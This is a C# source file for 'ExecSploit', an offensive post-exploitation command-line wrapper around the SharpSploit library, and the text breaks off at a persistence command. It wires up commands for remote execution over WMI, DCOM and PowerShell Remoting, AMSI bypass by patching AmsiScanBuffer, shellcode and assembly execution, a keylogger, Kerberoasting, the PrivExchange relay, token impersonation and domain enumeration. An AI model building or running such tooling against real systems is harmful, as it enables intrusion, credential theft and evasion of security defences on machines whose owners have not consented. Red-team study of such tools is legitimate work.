using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
//using System.CommandLine;
using ExecSploit.CommandLine;
using System.Reflection;
using System.IO;

namespace ExecSploit
{
    public class Program
    {

        public static bool fileOut = false;
        public static String outPath = "";

        public static void getResult(String result) {

            if (fileOut) {
                try
                {
                    Random random = new Random();
                    if (outPath != "") {
                        
                        using (StreamWriter writer = new StreamWriter(outPath, true))
                        {
                            writer.WriteLine(result);
                        }
                    }
                    else {
                        string path = "C:\\WINDOWS\\Temp";
                        string file = "result" + random.Next(999, 9999).ToString() + ".txt";
                        string fullpath = path + "\\" + file;
                        using (StreamWriter writer = new StreamWriter(fullpath, true))
                        {
                            writer.WriteLine(result);
                        }
                        Console.WriteLine("[+] Resuklt was saved at " + fullpath);
                    }
                    

                    
                }
                catch (Exception e) { Console.WriteLine("[!] Error writing to file : " + e.Message + Environment.NewLine + e.StackTrace);
                }
            }
            else {
                Console.WriteLine(result);
            }
        }

        public static void Main(string[] args)
        {
            string resource1 = "ExecSploit.Resources.net40.SharpSploit.dll"; 

            string resource3 = "ExecSploit.Resources.System.DirectoryServices.dll";



            EmbeddedAssembly.Load(resource1, "SharpSploit.dll");

            EmbeddedAssembly.Load(resource3, "System.DirectoryServices.dll");



            AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(CurrentDomain_AssemblyResolve);

            var rootCommand = new RootCommand("SharpSploit Porting to CommandLine.");
            // WMICommand_Command
            var WMICommand_Command = new Command("WMICommand", "Execute a process on a remote system using Win32_Process Create, optionally with alternate credentials.");

            var WMICommand_ComputerName_Option = new Option<String>(
                name: "/ComputerName",
                description: "ComputerName to create the process on.");

            WMICommand_Command.AddOption(WMICommand_ComputerName_Option);

            var WMICommand_Command_Option = new Option<String>(
                name: "/Command",
                description: "Command line to execute on the remote system.");

            WMICommand_Command.AddOption(WMICommand_Command_Option);

            var WMICommand_Username_Option = new Option<String>(
                name: "/Username",
                description: "Username to authenticate as. Format: DOMAIN\\Username (optional)",
                defaultValue: "");

            WMICommand_Command.AddOption(WMICommand_Username_Option);

            var WMICommand_Password_Option = new Option<String>(
                name: "/Password",
                description: "Password to authenticate the user. (optional)",
                defaultValue: "");

            WMICommand_Command.AddOption(WMICommand_Password_Option);

            rootCommand.AddCommand(WMICommand_Command);

            WMICommand_Command.SetHandler((ComputerName, Command, Username, Password) =>
            {
                String WMICommand_Command_result = WMICommand.Execute(ComputerName, Command, Username, Password);
                getResult(WMICommand_Command_result);
            });

            // PowerShellRemotingCommand
            var PowerShellRemotingCommand_Command = new Command("PowerShellRemotingCommand", "Execute a PowerShell command on a remote system using PowerShell Remoting, optionally with alternate credentials.");

            var PowerShellRemotingCommand_ComputerName_Option = new Option<String>(
                name: "/ComputerName",
                description: "ComputerName of the remote system.");

            PowerShellRemotingCommand_Command.AddOption(PowerShellRemotingCommand_ComputerName_Option);

            var PowerShellRemotingCommand_Command_Option = new Option<String>(
                name: "/Command",
                description: "PowerShell command to execute on the remote system.");
            PowerShellRemotingCommand_Command.AddOption(PowerShellRemotingCommand_Command_Option);

            var PowerShellRemotingCommand_Domain_Option = new Option<String>(
                name: "/Domain",
                description: "The domain to execute as.",
                defaultValue: "");

            PowerShellRemotingCommand_Command.AddOption(PowerShellRemotingCommand_Domain_Option);

            var PowerShellRemotingCommand_Username_Option = new Option<String>(
                name: "/Username",
                description: "The username to execute as.",
                defaultValue: "");

            PowerShellRemotingCommand_Command.AddOption(PowerShellRemotingCommand_Username_Option);

            var PowerShellRemotingCommand_Password_Option = new Option<String>(
                name: "/Password",
                description: "The password to execute as.",
                defaultValue: "");

            PowerShellRemotingCommand_Command.AddOption(PowerShellRemotingCommand_Password_Option);

            rootCommand.AddCommand(PowerShellRemotingCommand_Command);

            PowerShellRemotingCommand_Command.SetHandler((ComputerName, Command, Domain, Username, Password) =>
            {
                String PowerShellRemotingCommand_Command_result = PowerShellRemotingCommand.Execute(ComputerName, Command, Domain, Username, Password);
                getResult(PowerShellRemotingCommand_Command_result);
            });

            // DCOMCommand_Command
            var DCOMCommand_Command = new Command("DCOMCommand", "Execute a process on a remote system using various DCOM methods.");

            var DCOMCommand_ComputerName_Option = new Option<String>(
                name: "/ComputerName",
                description: "ComputerName to execute the process on.");

            DCOMCommand_Command.AddOption(DCOMCommand_ComputerName_Option);

            var DCOMCommand_Command_Option = new Option<String>(
                name: "/Command",
                description: "Executable to execute on the remote system.");

            DCOMCommand_Command.AddOption(DCOMCommand_Command_Option);

            var DCOMCommand_Parameters_Option = new Option<String>(
                name: "/Parameters",
                description: "Command line parameters to pass to the Command.",
                defaultValue: "");

            DCOMCommand_Command.AddOption(DCOMCommand_Parameters_Option);

            var DCOMCommand_Directory_Option = new Option<String>(
                name: "/Directory",
                description: "Directory on the remote system containing the Command executable.",
                defaultValue: "");

            DCOMCommand_Command.AddOption(DCOMCommand_Directory_Option);

            var DCOMCommand_Method_Option = new Option<String>(
                name: "/Method",
                description: "DCOM method to use for execution.",
                defaultValue: "");

            DCOMCommand_Command.AddOption(DCOMCommand_Method_Option);

            rootCommand.AddCommand(DCOMCommand_Command);

            DCOMCommand_Command.SetHandler((ComputerName, Command, Parameters, Directory, Method) =>
            {
                String DCOMCommand_Command_result = DCOMCommand.Execute(ComputerName, Command, Parameters, Directory, Method);
                getResult(DCOMCommand_Command_result);
            });

            // ScreenShot_Command
            var ScreenShot_Command = new Command("ScreenShot", "Takes a screenshot of the currently active desktop, move into a targeted pid for specific desktops");

            rootCommand.AddCommand(ScreenShot_Command);

            ScreenShot_Command.SetHandler(() =>
            {
                String ScreenShot_Command_result = ScreenShot.Execute();
                getResult(ScreenShot_Command_result);
            });

            // Download
            var Download_Command = new Command("Download", "Download a file.");

            var Download_FileName_Option = new Option<String>(
                name: "/FileName",
                description: "Remote file name to download.");

            Download_Command.AddOption(Download_FileName_Option);

            rootCommand.AddCommand(Download_Command);

            Download_Command.SetHandler((FileName) =>
            {
                String Download_Command_result = Download.Execute(FileName);
                getResult(Download_Command_result);
            });

            // upload
            var Upload_Command = new Command("Upload", "Upload a file.");

            var Upload_FilePath_Option = new Option<String>(
                name: "/FilePath",
                description: "Remote file path to write to.");

            Upload_Command.AddOption(Upload_FilePath_Option);

            var Upload_FileContents_Option = new Option<String>(
                name: "/FileContents",
                description: "Base64 contents of the file to be written.");

            Upload_Command.AddOption(Upload_FileContents_Option);

            rootCommand.AddCommand(Upload_Command);

            Upload_Command.SetHandler((FilePath, FileContents) =>
            {
                String Upload_Command_result = Upload.Execute(FilePath, FileContents);
                getResult(Upload_Command_result);
            });

            // WhoAmI
            var WhoAmI_Command = new Command("WhoAmI", "Gets the username of the currently used/impersonated token.");

            rootCommand.AddCommand(WhoAmI_Command);

            WhoAmI_Command.SetHandler(() =>
            {
                String WhoAmI_Command_result = WhoAmI.Execute();
                getResult(WhoAmI_Command_result);
            });

            // GetCurrentDirectory
            var GetCurrentDirectory_Command = new Command("GetCurrentDirectory", "Get the Grunt's Current Working Directory");

            GetCurrentDirectory_Command.AddAlias("pwd");

            rootCommand.AddCommand(GetCurrentDirectory_Command);

            GetCurrentDirectory_Command.SetHandler(() =>
            {
                String GetCurrentDirectory_Command_result = GetCurrentDirectory.Execute();
                getResult(GetCurrentDirectory_Command_result);
            });

            // ChangeDirectory
            var ChangeDirectory_Command = new Command("ChangeDirectory", "Change the current directory.");

            ChangeDirectory_Command.AddAlias("cd");

            var ChangeDirectory_Directory_Option = new Option<String>(
                name: "/Directory",
                description: "Directory to change to.");

            ChangeDirectory_Command.AddOption(ChangeDirectory_Directory_Option);

            rootCommand.AddCommand(ChangeDirectory_Command);

            ChangeDirectory_Command.SetHandler((Directory) =>
            {
                String ChangeDirectory_Command_result = ChangeDirectory.Execute(Directory);
                getResult(ChangeDirectory_Command_result);
            });

            // ReadTextFile
            var ReadTextFile_Command = new Command("ReadTextFile", "Read a text file on disk.");

            ReadTextFile_Command.AddAlias("cat");

            var ReadTextFile_Path_Option = new Option<String>(
                name: "/Path",
                description: "Path to the file.");

            ReadTextFile_Command.AddOption(ReadTextFile_Path_Option);

            rootCommand.AddCommand(ReadTextFile_Command);

            ReadTextFile_Command.SetHandler((Path) =>
            {
                String ReadTextFile_Command_result = ReadTextFile.Execute(Path);
                getResult(ReadTextFile_Command_result);
            });

            // CreateDirectory
            var CreateDirectory_Command = new Command("CreateDirectory", "Creates all directories and subdirectories in the specified path unless they already exist.");

            CreateDirectory_Command.AddAlias("mkdir");

            var CreateDirectory_Path_Option = new Option<String>(
                name: "/Path",
                description: "The directory to create.");

            CreateDirectory_Command.AddOption(CreateDirectory_Path_Option);

            rootCommand.AddCommand(CreateDirectory_Command);

            CreateDirectory_Command.SetHandler((Path) =>
            {
                String CreateDirectory_Command_result = CreateDirectory.Execute(Path);
                getResult(CreateDirectory_Command_result);
            });

            // Delete
            var Delete_Command = new Command("Delete", "Delete a file or directory.");

            Delete_Command.AddAlias("rm");

            Delete_Command.AddAlias("del");

            var Delete_Path_Option = new Option<String>(
                name: "/Path",
                description: "The path of the file or directory to delete.");

            Delete_Command.AddOption(Delete_Path_Option);

            rootCommand.AddCommand(Delete_Command);

            Delete_Command.SetHandler((Path) =>
            {
                String Delete_Command_result = Delete.Execute(Path);
                getResult(Delete_Command_result);
            });

            // Copy
            var Copy_Command = new Command("Copy", "Copy a file from one location to another.");

            Copy_Command.AddAlias("cp");

            var Copy_Source_Option = new Option<String>(
                name: "/Source",
                description: "Source file to copy");

            Copy_Command.AddOption(Copy_Source_Option);

            var Copy_Destination_Option = new Option<String>(
                name: "/Destination",
                description: "Destination to copy file to.");

            Copy_Command.AddOption(Copy_Destination_Option);

            rootCommand.AddCommand(Copy_Command);

            Copy_Command.SetHandler((Source, Destination) =>
            {
                String Copy_Command_result = Copy.Execute(Source, Destination);
                getResult(Copy_Command_result);
            });

            // kill
            var Kill_Command = new Command("Kill", "Kills the process of a given Process ID.");

            var Kill_ProcessID_Option = new Option<String>(
                name: "/ProcessID",
                description: "The Process ID of the process to kill.");

            Kill_Command.AddOption(Kill_ProcessID_Option);

            rootCommand.AddCommand(Kill_Command);

            Kill_Command.SetHandler((ProcessID) =>
            {
                String Kill_Command_result = Kill.Execute(ProcessID);
                getResult(Kill_Command_result);
            });


            // PrivExchange
            var PrivExchange_Command = new Command("PrivExchange", "Performs the PrivExchange attack by sending a push notification to EWS.");

            var PrivExchange_EWSUri_Option = new Option<String>(
                name: "/EWSUri",
                description: "The URI of the Exchange EWS instance to perform the relay against. For example: http(s)://<hostname>:<port>/EWS/Exchange.asmx.");

            PrivExchange_Command.AddOption(PrivExchange_EWSUri_Option);

            var PrivExchange_RelayUri_Option = new Option<String>(
                name: "/RelayUri",
                description: "The URI of the external relay of the Exchange authentication.");

            PrivExchange_Command.AddOption(PrivExchange_RelayUri_Option);

            var PrivExchange_ExchangeVersion_Option = new Option<String>(
                name: "/ExchangeVersion",
                description: "Microsoft Exchange version. Defaults to Exchange2010.");

            PrivExchange_Command.AddOption(PrivExchange_ExchangeVersion_Option);

            rootCommand.AddCommand(PrivExchange_Command);

            PrivExchange_Command.SetHandler((EWSUri, RelayUri, ExchangeVersion) =>
            {
                String PrivExchange_Command_result = PrivExchange.Execute(EWSUri, RelayUri, ExchangeVersion);
                getResult(PrivExchange_Command_result);
            });

            // BypassAmsi
            var BypassAmsi_Command = new Command("BypassAmsi", "Bypasses AMSI by patching the AmsiScanBuffer function.");

            rootCommand.AddCommand(BypassAmsi_Command);

            BypassAmsi_Command.SetHandler(() =>
            {
                String BypassAmsi_Command_result = BypassAmsi.Execute();
                getResult(BypassAmsi_Command_result);
            });

            // Shell
            var Shell_Command = new Command("Shell", "Execute a Shell command using CreateProcess.");

            Shell_Command.AddAlias("CreateProcess");

            var Shell_ShellCommand_Option = new Option<String>(
                name: "/ShellCommand",
                description: "The ShellCommand to execute.");

            Shell_Command.AddOption(Shell_ShellCommand_Option);

            rootCommand.AddCommand(Shell_Command);

            Shell_Command.SetHandler((ShellCommand) =>
            {
                String Shell_Command_result = CreateProcess.Execute(ShellCommand);
                getResult(Shell_Command_result);
            });

            // ShellCmd
            var ShellCmd_Command = new Command("ShellCmd", "Execute a Shell command using CreateProcess with \"cmd.exe / c\"");

            ShellCmd_Command.AddAlias("CreateCmdProcess");

            ShellCmd_Command.AddAlias("cmd");

            var ShellCmd_ShellCommand_Option = new Option<String>(
                name: "/ShellCommand",
                description: "The ShellCommand to execute.");

            ShellCmd_Command.AddOption(ShellCmd_ShellCommand_Option);

            rootCommand.AddCommand(ShellCmd_Command);

            ShellCmd_Command.SetHandler((ShellCommand) =>
            {
                String ShellCmd_Command_result = ShellCmd.Execute(ShellCommand);
                getResult(ShellCmd_Command_result);
            });

            // ShellRunAs
            var ShellRunAs_Command = new Command("ShellRunAs", "Execute a Shell command using CreateProcess as a specified user.");

            ShellRunAs_Command.AddAlias("CreateProcessAsUser");

            ShellRunAs_Command.AddAlias("runas");

            var ShellRunAs_ShellCommand_Option = new Option<String>(
                name: "/ShellCommand",
                description: "The ShellCommand to execute.");

            ShellRunAs_Command.AddOption(ShellRunAs_ShellCommand_Option);

            var ShellRunAs_Username_Option = new Option<String>(
                name: "/Username",
                description: "The username to execute as.");

            ShellRunAs_Command.AddOption(ShellRunAs_Username_Option);

            var ShellRunAs_Domain_Option = new Option<String>(
                name: "/Domain",
                description: "The domain to execute as.");

            ShellRunAs_Command.AddOption(ShellRunAs_Domain_Option);

            var ShellRunAs_Password_Option = new Option<String>(
                name: "/Password",
                description: "The password to execute as.");

            ShellRunAs_Command.AddOption(ShellRunAs_Password_Option);

            rootCommand.AddCommand(ShellRunAs_Command);

            ShellRunAs_Command.SetHandler((ShellCommand, Username, Domain, Password) =>
            {
                String ShellRunAs_Command_result = CreateProcessAsUser.Execute(ShellCommand, Username, Domain, Password);
                getResult(ShellRunAs_Command_result);
            });

            // ShellCmdRunAs
            var ShellCmdRunAs_Command = new Command("ShellCmdRunAs", "Execute a Shell command using CreateProcess with \"cmd.exe / c\" as a specified user.");

            ShellCmdRunAs_Command.AddAlias("CreateCmdProcessAsUser");

            ShellCmdRunAs_Command.AddAlias("runascmd");

            var ShellCmdRunAs_ShellCommand_Option = new Option<String>(
                name: "/ShellCommand",
                description: "The ShellCommand to execute.");

            ShellCmdRunAs_Command.AddOption(ShellCmdRunAs_ShellCommand_Option);

            var ShellCmdRunAs_Username_Option = new Option<String>(
                name: "/Username",
                description: "The username to execute as.");

            ShellCmdRunAs_Command.AddOption(ShellCmdRunAs_Username_Option);

            var ShellCmdRunAs_Domain_Option = new Option<String>(
                name: "/Domain",
                description: "The domain to execute as.");

            ShellCmdRunAs_Command.AddOption(ShellCmdRunAs_Domain_Option);

            var ShellCmdRunAs_Password_Option = new Option<String>(
                name: "/Password",
                description: "The password to execute as.");

            ShellCmdRunAs_Command.AddOption(ShellCmdRunAs_Password_Option);

            rootCommand.AddCommand(ShellCmdRunAs_Command);

            ShellCmdRunAs_Command.SetHandler((ShellCommand, Username, Domain, Password) =>
            {
                String ShellCmdRunAs_Command_result = ShellCmdRunAs.Execute(ShellCommand, Username, Domain, Password);
                getResult(ShellCmdRunAs_Command_result);
            });

            // CreateProcessWithToken
            var CreateProcessWithToken_Command = new Command("CreateProcessWithToken", "Creates a process with the currently impersonated token.");

            var CreateProcessWithToken_Command_Option = new Option<String>(
                name: "/Command",
                description: "The process to create.");

            CreateProcessWithToken_Command.AddOption(CreateProcessWithToken_Command_Option);

            var CreateProcessWithToken_Path_Option = new Option<String>(
                name: "/Path",
                description: "The working directory from which to create a new process.",
                defaultValue: "");

            CreateProcessWithToken_Command.AddOption(CreateProcessWithToken_Path_Option);

            rootCommand.AddCommand(CreateProcessWithToken_Command);

            CreateProcessWithToken_Command.SetHandler((Command, Path) =>
            {
                String CreateProcessWithToken_Command_result = CreateProcessWithToken.Execute(Command, Path);
                getResult(CreateProcessWithToken_Command_result);
            });

            // PowerShell
            var PowerShell_Command = new Command("PowerShell", "Execute a PowerShell command.");

            var PowerShell_PowerShellCommand_Option = new Option<String>(
                name: "/PowerShellCommand",
                description: "The PowerShellCommand to execute.");

            PowerShell_Command.AddOption(PowerShell_PowerShellCommand_Option);

            rootCommand.AddCommand(PowerShell_Command);



            PowerShell_Command.SetHandler((PowerShellCommand) =>
            {
                String PowerShell_Command_result = PowerShell.Execute(PowerShellCommand);
                getResult(PowerShell_Command_result);
            });

            // Assembly
            var Assembly_Command = new Command("Assembly", "Execute a dotnet Assembly EntryPoint.");

            var Assembly_Assembly_Option = new Option<String>(
                name: "/Assembly",
                description: "The Base64 encoded Assembly bytes.");

            Assembly_Command.AddOption(Assembly_Assembly_Option);

            var Assembly_AssemblyName_Option = new Option<String>(
                name: "/AssemblyName",
                description: "Name of the assembly.");

            Assembly_Command.AddOption(Assembly_AssemblyName_Option);

            var Assembly_Parameters_Option = new Option<String>(
                name: "/Parameters",
                description: "The command-line parameters to pass to the assembly's EntryPoint.",
                defaultValue: "");

            Assembly_Command.AddOption(Assembly_Parameters_Option);

            rootCommand.AddCommand(Assembly_Command);

            Assembly_Command.SetHandler((Assembly, AssemblyName, Parameters) =>
            {
                String Assembly_Command_result = ExecSploit.Assembly.Execute(Assembly, AssemblyName, Parameters);
                getResult(Assembly_Command_result);
            });

            // AssemblyReflect
            var AssemblyReflect_Command = new Command("AssemblyReflect", "Execute a dotnet Assembly method using reflection.");

            var AssemblyReflect_Assembly_Option = new Option<String>(
                name: "/Assembly",
                description: "The Base64 encoded Assembly bytes.");

            AssemblyReflect_Command.AddOption(AssemblyReflect_Assembly_Option);

            var AssemblyReflect_AssemblyName_Option = new Option<String>(
                name: "/AssemblyName",
                description: "Name of the assembly.");

            AssemblyReflect_Command.AddOption(AssemblyReflect_AssemblyName_Option);

            var AssemblyReflect_TypeName_Option = new Option<String>(
                name: "/TypeName",
                description: "The name of the Type that contains the method to execute.");

            AssemblyReflect_Command.AddOption(AssemblyReflect_TypeName_Option);

            var AssemblyReflect_MethodName_Option = new Option<String>(
                name: "/MethodName",
                description: "The name of the method to execute.");

            AssemblyReflect_Command.AddOption(AssemblyReflect_MethodName_Option);

            var AssemblyReflect_Parameters_Option = new Option<String>(
                name: "/Parameters",
                description: "The parameters to pass to the method.",
                defaultValue: "");

            AssemblyReflect_Command.AddOption(AssemblyReflect_Parameters_Option);

            rootCommand.AddCommand(AssemblyReflect_Command);

            AssemblyReflect_Command.SetHandler((Assembly, AssemblyName, TypeName, MethodName, Parameters) =>
            {
                String AssemblyReflect_Command_result = AssemblyReflect.Execute(Assembly, AssemblyName, TypeName, MethodName, Parameters);
                getResult(AssemblyReflect_Command_result);
            });

            // ShellCode
            var ShellCode_Command = new Command("ShellCode", "Executes a specified shellcode byte array by copying it to pinned memory, modifying the memory permissions, and executing.");

            var ShellCode_ShellCode_Option = new Option<String>(
                name: "/ShellCode",
                description: "ShellCode to execute.");

            ShellCode_Command.AddOption(ShellCode_ShellCode_Option);

            rootCommand.AddCommand(ShellCode_Command);

            ShellCode_Command.SetHandler((ShellCode) =>
            {
                String ShellCode_Command_result = ExecSploit.ShellCode.Execute(ShellCode);
                getResult(ShellCode_Command_result);
            });

            // GetNetSession
            var GetNetSession_Command = new Command("GetNetSession", "Gets a list of `SessionInfo`s from specified remote computer(s).");

            var GetNetSession_ComputerNames_Option = new Option<String>(
                name: "/ComputerNames",
                description: "List of comma-delimited ComputerNames to query.",
                defaultValue: "");

            GetNetSession_Command.AddOption(GetNetSession_ComputerNames_Option);

            rootCommand.AddCommand(GetNetSession_Command);

            GetNetSession_Command.SetHandler((ComputerNames) =>
            {
                String GetNetSession_Command_result = GetNetSession.Execute(ComputerNames);
                getResult(GetNetSession_Command_result);
            });

            // GetNetLoggedOnUser
            var GetNetLoggedOnUser_Command = new Command("GetNetLoggedOnUser", "Gets a list of `LoggedOnUser`s from specified remote computer(s).");

            var GetNetLoggedOnUser_ComputerNames_Option = new Option<String>(
                name: "/ComputerNames",
                description: "List of comma-delimited ComputerNames to query.",
                defaultValue: "");

            GetNetLoggedOnUser_Command.AddOption(GetNetLoggedOnUser_ComputerNames_Option);

            rootCommand.AddCommand(GetNetLoggedOnUser_Command);

            GetNetLoggedOnUser_Command.SetHandler((ComputerNames) =>
            {
                String GetNetLoggedOnUser_Command_result = GetNetLoggedOnUser.Execute(ComputerNames);
                getResult(GetNetLoggedOnUser_Command_result);
            });

            // GetNetLocalGroupMember
            var GetNetLocalGroupMember_Command = new Command("GetNetLocalGroupMember", "Gets a list of `LocalGroupMember`s from specified remote computer(s).");

            var GetNetLocalGroupMember_ComputerNames_Option = new Option<String>(
                name: "/ComputerNames",
                description: "List of comma-delimited ComputerNames to query.",
                defaultValue: "");

            GetNetLocalGroupMember_Command.AddOption(GetNetLocalGroupMember_ComputerNames_Option);

            var GetNetLocalGroupMember_LocalGroup_Option = new Option<String>(
                name: "/LocalGroup",
                description: "LocalGroup name to query for members.",
                defaultValue: "");

            GetNetLocalGroupMember_Command.AddOption(GetNetLocalGroupMember_LocalGroup_Option);

            rootCommand.AddCommand(GetNetLocalGroupMember_Command);

            GetNetLocalGroupMember_Command.SetHandler((ComputerNames, LocalGroup) =>
            {
                String GetNetLocalGroupMember_Command_result = GetNetLocalGroupMember.Execute(ComputerNames, LocalGroup);
                getResult(GetNetLocalGroupMember_Command_result);
            });

            // GetNetLocalGroup
            var GetNetLocalGroup_Command = new Command("GetNetLocalGroup", "Gets a list of `LocalGroup`s from specified remote computer(s).");

            var GetNetLocalGroup_ComputerNames_Option = new Option<String>(
                name: "/ComputerNames",
                description: "List of comma-delimited ComputerNames to query.",
                defaultValue: "");

            GetNetLocalGroup_Command.AddOption(GetNetLocalGroup_ComputerNames_Option);

            rootCommand.AddCommand(GetNetLocalGroup_Command);

            GetNetLocalGroup_Command.SetHandler((ComputerNames) =>
            {
                String GetNetLocalGroup_Command_result = GetNetLocalGroup.Execute(ComputerNames);
                getResult(GetNetLocalGroup_Command_result);
            });

            // GetDomainGroup
            var GetDomainGroup_Command = new Command("GetDomainGroup", "Gets a list of specified (or all) group `DomainObject`s in the current Domain.");

            var GetDomainGroup_Identities_Option = new Option<String>(
                name: "/Identities",
                description: "List of comma-delimited groups to retrieve.",
                defaultValue: "");

            GetDomainGroup_Command.AddOption(GetDomainGroup_Identities_Option);

            rootCommand.AddCommand(GetDomainGroup_Command);

            GetDomainGroup_Command.SetHandler((Identities) =>
            {
                String GetDomainGroup_Command_result = GetDomainGroup.Execute(Identities);
                getResult(GetDomainGroup_Command_result);
            });

            // GetDomainUser
            var GetDomainUser_Command = new Command("GetDomainUser", "Gets a list of specified (or all) user `DomainObject`s in the current Domain.");

            var GetDomainUser_Identities_Option = new Option<String>(
                name: "/Identities",
                description: "List of comma-delimited usernames to retrieve.",
                defaultValue: "");

            GetDomainUser_Command.AddOption(GetDomainUser_Identities_Option);

            rootCommand.AddCommand(GetDomainUser_Command);

            GetDomainUser_Command.SetHandler((Identities) =>
            {
                String GetDomainUser_Command_result = GetDomainUser.Execute(Identities);
                getResult(GetDomainUser_Command_result);
            });

            // GetDomainComputer
            var GetDomainComputer_Command = new Command("GetDomainComputer", "Gets a list of specified (or all) computer `DomainObject`s in the current Domain.");

            var GetDomainComputer_Identities_Option = new Option<String>(
                name: "/Identities",
                description: "List of comma-delimited computers to retrieve.",
                defaultValue: "");

            GetDomainComputer_Command.AddOption(GetDomainComputer_Identities_Option);

            rootCommand.AddCommand(GetDomainComputer_Command);

            GetDomainComputer_Command.SetHandler((Identities) =>
            {
                String GetDomainComputer_Command_result = GetDomainComputer.Execute(Identities);
                getResult(GetDomainComputer_Command_result);
            });

            // Keylogger
            var Keylogger_Command = new Command("Keylogger", "Monitor the keystrokes for a specified period of time.");

            var Keylogger_Time_Option = new Option<String>(
                name: "/Time",
                description: "Specifies the number of seconds to run the keylogger for.",
                defaultValue: "");

            Keylogger_Command.AddOption(Keylogger_Time_Option);

            rootCommand.AddCommand(Keylogger_Command);

            Keylogger_Command.SetHandler((Time) =>
            {
                String Keylogger_Command_result = ExecSploit.Exec_Keylogger.Execute(Time);
                getResult(Keylogger_Command_result);
            });

            // Kerberoast
            var Kerberoast_Command = new Command("Kerberoast", "Perform a \"Kerberoast\" attack that retrieves crackable service tickets for Domain User's w/ an SPN set.");

            var Kerberoast_Usernames_Option = new Option<String>(
                name: "/Usernames",
                description: "Username(s) to port scan. Comma-delimited username list.");

            Kerberoast_Command.AddOption(Kerberoast_Usernames_Option);

            var Kerberoast_HashFormat_Option = new Option<String>(
                name: "/HashFormat",
                description: "Format to output the hashes (\"Hashcat\" or \"John\").");

            Kerberoast_Command.AddOption(Kerberoast_HashFormat_Option);

            rootCommand.AddCommand(Kerberoast_Command);

            Kerberoast_Command.SetHandler((Usernames, HashFormat) =>
            {
                String Kerberoast_Command_result = Kerberoast.Execute(Usernames, HashFormat);
                getResult(Kerberoast_Command_result);
            });

            // PortScan
            var PortScan_Command = new Command("PortScan", "Perform a TCP port scan.");

            var PortScan_ComputerNames_Option = new Option<String>(
                name: "/ComputerNames",
                description: "ComputerName(s) to port scan. Can be a DNS name, IP address, or CIDR range.");

            PortScan_Command.AddOption(PortScan_ComputerNames_Option);

            var PortScan_Ports_Option = new Option<String>(
                name: "/Ports",
                description: "Ports to scan. Comma-delimited port list, use hyphens for port ranges");

            PortScan_Command.AddOption(PortScan_Ports_Option);

            var PortScan_Ping_Option = new Option<String>(
                name: "/Ping",
                description: "Boolean, whether to ping hosts prior to port scanning.",
                defaultValue: "");

            PortScan_Command.AddOption(PortScan_Ping_Option);

            rootCommand.AddCommand(PortScan_Command);

            PortScan_Command.SetHandler((ComputerNames, Ports, Ping) =>
            {
                String PortScan_Command_result = PortScan.Execute(ComputerNames, Ports, Ping);
                getResult(PortScan_Command_result);
            });

            // ListDirectory
            var ListDirectory_Command = new Command("ListDirectory", "Get a listing of the current directory.");

            ListDirectory_Command.AddAlias("ls");

            var ListDirectory_Path_Option = new Option<String>(
                name: "/Path",
                description: "Directory to list.",
                defaultValue: "");

            ListDirectory_Command.AddOption(ListDirectory_Path_Option);

            rootCommand.AddCommand(ListDirectory_Command);

            ListDirectory_Command.SetHandler((Path) =>
            {
                String ListDirectory_Command_result = ListDirectory.Execute(Path);
                getResult(ListDirectory_Command_result);
            });

            // ProcessList
            var ProcessList_Command = new Command("ProcessList", "Get a list of currently running processes.");

            ProcessList_Command.AddAlias("ps");

            rootCommand.AddCommand(ProcessList_Command);

            ProcessList_Command.SetHandler(() =>
            {
                String ProcessList_Command_result = ProcessList.Execute();
                getResult(ProcessList_Command_result);
            });

            // SetRegistryKey
            var SetRegistryKey_Command = new Command("SetRegistryKey", "Sets a value into the registry.");

            var SetRegistryKey_RegPath_Option = new Option<String>(
                name: "/RegPath",
                description: "The full path to the registry value to be read.");

            SetRegistryKey_Command.AddOption(SetRegistryKey_RegPath_Option);

            var SetRegistryKey_Value_Option = new Option<String>(
                name: "/Value",
                description: "The value to write to the registry key.");

            SetRegistryKey_Command.AddOption(SetRegistryKey_Value_Option);

            rootCommand.AddCommand(SetRegistryKey_Command);

            SetRegistryKey_Command.SetHandler((RegPath, Value) =>
            {
                String SetRegistryKey_Command_result = SetRegistryKey.Execute(RegPath, Value);
                getResult(SetRegistryKey_Command_result);
            });

            // GetRegistryKey
            var GetRegistryKey_Command = new Command("GetRegistryKey", "Gets a value stored in registry.");

            var GetRegistryKey_RegPath_Option = new Option<String>(
                name: "/RegPath",
                description: "The full path to the registry value to be read.");

            GetRegistryKey_Command.AddOption(GetRegistryKey_RegPath_Option);

            rootCommand.AddCommand(GetRegistryKey_Command);

            GetRegistryKey_Command.SetHandler((RegPath) =>
            {
                String GetRegistryKey_Command_result = GetRegistryKey.Execute(RegPath);
                getResult(GetRegistryKey_Command_result);
            });

            // SetRemoteRegistryKey
            var SetRemoteRegistryKey_Command = new Command("SetRemoteRegistryKey", "Sets a value into the registry on a remote system.");

            var SetRemoteRegistryKey_Hostname_Option = new Option<String>(
                name: "/Hostname",
                description: "The Hostname of the remote system to write to.");

            SetRemoteRegistryKey_Command.AddOption(SetRemoteRegistryKey_Hostname_Option);

            var SetRemoteRegistryKey_RegPath_Option = new Option<String>(
                name: "/RegPath",
                description: "The full path to the registry value to be read.");

            SetRemoteRegistryKey_Command.AddOption(SetRemoteRegistryKey_RegPath_Option);

            var SetRemoteRegistryKey_Value_Option = new Option<String>(
                name: "/Value",
                description: "The value to write to the registry key.");

            SetRemoteRegistryKey_Command.AddOption(SetRemoteRegistryKey_Value_Option);

            rootCommand.AddCommand(SetRemoteRegistryKey_Command);

            SetRemoteRegistryKey_Command.SetHandler((Hostname, RegPath, Value) =>
            {
                String SetRemoteRegistryKey_Command_result = SetRemoteRegistryKey.Execute(Hostname, RegPath, Value);
                getResult(SetRemoteRegistryKey_Command_result);
            });

            // GetRemoteRegistryKey
            var GetRemoteRegistryKey_Command = new Command("GetRemoteRegistryKey", "Gets a value stored in registry on a remote system.");

            var GetRemoteRegistryKey_Hostname_Option = new Option<String>(
                name: "/Hostname",
                description: "The Hostname of the remote system to query.");

            GetRemoteRegistryKey_Command.AddOption(GetRemoteRegistryKey_Hostname_Option);

            var GetRemoteRegistryKey_RegPath_Option = new Option<String>(
                name: "/RegPath",
                description: "The full path to the registry value to be read.");

            GetRemoteRegistryKey_Command.AddOption(GetRemoteRegistryKey_RegPath_Option);

            rootCommand.AddCommand(GetRemoteRegistryKey_Command);

            GetRemoteRegistryKey_Command.SetHandler((Hostname, RegPath) =>
            {
                String GetRemoteRegistryKey_Command_result = GetRemoteRegistryKey.Execute(Hostname, RegPath);
                getResult(GetRemoteRegistryKey_Command_result);
            });

            // PersistStartup
